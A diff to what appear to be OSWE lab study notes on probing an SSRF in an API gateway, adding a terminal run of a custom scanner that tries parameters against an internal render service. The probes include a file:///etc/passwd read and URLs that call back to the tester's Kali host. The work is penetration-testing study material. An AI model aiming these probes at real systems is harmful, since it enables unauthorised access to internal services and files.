@@ -481,7 +481,7 @@ Output:
 ```
 We received one interesting response: `"Request failed with status code 400"`. An HTTP `400 Bad Request` usually indicates that the server cannot process a request due to missing data or a client error.
 
-If the service generates content, we need to determine how to supply data to it. We'll start by testing a small set of relevant parameter names and values, including our Kali host in URLs to monitor for callbacks. We can expand the list later using wordlists if needed.
+If the service generates content, we need to determine how to supply data to it. We'll start by testing a small set of relevant parameter names and values, **including our Kali host in URLs to monitor for callbacks**.
 
 ```text
 ?data=foobar
@@ -489,4 +489,19 @@ If the service generates content, we need to determine how to supply data to it.
 ?url=http://192.168.45.203/render/url
 ?input=foobar
 ?target=http://192.168.45.203/render/target
+```
+Even without valid parameters, triggering errors on the render service might reveal useful clues. In unfamiliar environments, subtle differences in server responses can help us understand the system. We'll run a new wordlist through our [ssrf_path_scanner.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/ssrf_path_scanner.py) script again, updating the SSRF target to the new URL.
+
+Output:
+```
+┌──(kali㉿kali)-[~]
+└─$ python3 ssrf_path_scanner.py -t http://apigateway:8000/files/import -s http://172.16.16.5:9000/api/render -p paths2.txt --timeout 5      
+?data=foobar    EXISTS: {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
+?file=file:///etc/passwd        EXISTS: {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
+?url=http://192.168.45.203/render/url   EXISTS: {"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}
+?input=foobar   EXISTS: {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
+?target=http://192.168.45.203/render/target     EXISTS: {"errors":[{"message":"Request failed with status code 400","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
+                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$ 
 ```
